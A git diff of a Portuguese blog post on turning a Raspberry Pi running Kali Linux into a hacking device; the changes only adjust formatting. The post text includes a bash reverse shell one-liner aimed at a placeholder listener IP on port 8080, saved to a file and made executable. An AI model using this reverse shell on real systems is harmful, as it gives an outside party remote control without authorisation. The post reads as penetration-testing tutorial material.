@@ -14,13 +14,13 @@ A publicação sobre como criar um raspberry para hacking não é exetamente igu
 
 1. Baixar o [Kali linux para arm](https://www.offensive-security.com/kali-linux-arm-images/). Escolha aquela que mais se adequa ao hardware que estiver sendo utilizado. Iremos utilizar o Kali pois é uma distribuição linux focada em segurança, e por conta disso, fornecerá diversas ferramentas que poderão ser utilizadas em missões futuras.
 
-![offensive security]({{ site.url }}/images/offensive-sec.png)
+<center>![offensive security]({{ site.url }}/images/offensive-sec.png)</center>
 
 2. Feito isso, precisamos criar um script que funcionará como nosso nosso shell reverso. Para tal, é recomendável utilizar o [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da pentest Monkey.
 
 {% highlight bash %}
 {% raw % }
- bash -i >& /dev/tcp/\<ip da maquina que está escutando\>/8080 0>&1
+bash -i >& /dev/tcp/\<ip da maquina que está escutando\>/8080 0>&1
 {% endraw %}
 {% endhighlight %}
 
@@ -28,7 +28,7 @@ Colocamos então o código acima em um arquivo (chamaremos ele de reverse) e con
 
 {% highlight bash %}
 {% raw %}
- chmod +x reverse
+chmod +x reverse
 {% endraw %}
 {% endhighlight %}
 
